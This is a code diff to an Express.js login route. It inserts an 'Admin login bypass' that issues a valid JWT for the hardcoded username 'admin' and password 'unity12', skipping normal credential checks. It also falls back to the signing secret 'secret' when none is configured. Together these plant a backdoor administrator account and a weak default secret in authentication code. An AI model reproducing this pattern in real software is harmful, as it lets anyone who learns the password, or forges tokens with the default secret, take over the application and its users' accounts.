@@ -61,6 +61,21 @@ router.post("/register", async (req, res) => {
 router.post("/login", async (req, res) => {
   try {
     const { username, password } = req.body;
+    //Admin login bypass
+    if(username === "admin" && password === "unity12"){
+      const token = jwt.sign(
+        { id: "admin_id", username: "admin" },
+        process.env.JWT_SECRET || "secret",
+        { expiresIn: "1h" }
+      );
+      return res.json({
+        success: true,
+        message: "Admin login successful",
+        token,
+        user: { id: "admin_id", username: "admin", email: "unknow@admin.co" }
+      });
+    }
+
     // Basic validation
     if (!username || !password) {
         return res.status(400).json({ message: "All fields are required" });
